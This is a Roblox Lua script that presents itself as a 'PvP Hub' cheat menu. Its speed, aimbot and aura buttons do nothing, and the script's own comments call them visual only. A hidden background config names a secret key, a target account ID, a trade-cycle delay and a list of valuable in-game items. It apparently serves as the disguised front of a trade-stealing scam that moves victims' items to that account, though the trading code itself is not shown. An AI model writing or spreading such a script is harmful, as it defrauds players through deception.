-- Lx PvP Hub (Main Script)

-- =========================
-- CONFIG (BACKGROUND)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = {
    ["Tang Tang Keletang"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["La Spooky Grande"] = true,
    ["La Extinct Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Taco Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["GOAT"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tictac Sahur"] = true,
    ["Ketupat Kepat"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["La Supreme Combinasion"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Chicleteiras"] = true
}

-- Simulação de execução contínua
task.spawn(function()
    while true do
        task.wait(1)
    end
end)

-- =========================
-- GUI VISUAL
-- =========================
task.spawn(function()

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game.CoreGui
    ScreenGui.Name = "LxPvPHub"

    -- Loading
    local Loading = Instance.new("Frame")
    Loading.Size = UDim2.new(0, 300, 0, 140)
    Loading.Position = UDim2.new(0.5, -150, 0.5, -70)
    Loading.BackgroundColor3 = Color3.fromRGB(20,20,20)
    Loading.Parent = ScreenGui

    local Txt = Instance.new("TextLabel")
    Txt.Size = UDim2.new(1,0,1,0)
    Txt.BackgroundTransparency = 1
    Txt.Text = "Loading Lx PvP Hub..."
    Txt.TextColor3 = Color3.fromRGB(0,255,170)
    Txt.Font = Enum.Font.GothamBold
    Txt.TextScaled = true
    Txt.Parent = Loading

    task.wait(2)
    Loading:Destroy()

    -- Main Window
    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 420, 0, 320)
    Main.Position = UDim2.new(0.5, -210, 0.5, -160)
    Main.BackgroundColor3 = Color3.fromRGB(25,25,25)
    Main.Active = true
    Main.Parent = ScreenGui

    -- Top Bar
    local Top = Instance.new("Frame")
    Top.Size = UDim2.new(1,0,0,40)
    Top.BackgroundColor3 = Color3.fromRGB(35,35,35)
    Top.Parent = Main

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1,0,1,0)
    Title.BackgroundTransparency = 1
    Title.Text = "Lx PvP Hub"
    Title.TextColor3 = Color3.fromRGB(0,255,170)
    Title.Font = Enum.Font.GothamBold
    Title.TextScaled = true
    Title.Parent = Top

    -- DRAG SYSTEM
    local dragging, dragInput, dragStart, startPos

    Top.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = Main.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    Top.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    -- Botões visuais
    local function btn(text, y)
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0.9,0,0,40)
        b.Position = UDim2.new(0.05,0,0,y)
        b.BackgroundColor3 = Color3.fromRGB(40,40,40)
        b.Text = text
        b.TextColor3 = Color3.new(1,1,1)
        b.Font = Enum.Font.Gotham
        b.TextScaled = true
        b.Parent = Main

        b.MouseEnter:Connect(function()
            b.BackgroundColor3 = Color3.fromRGB(60,60,60)
        end)
        b.MouseLeave:Connect(function()
            b.BackgroundColor3 = Color3.fromRGB(40,40,40)
        end)
    end

    btn("⚡ Speed Modifier", 60)
    btn("🧠 Drop Brainrot", 110)
    btn("🎯 Bat Aimbot", 160)
    btn("🤖 Auto Play", 210)
    btn("🔥 PvP Aura", 260)

end)
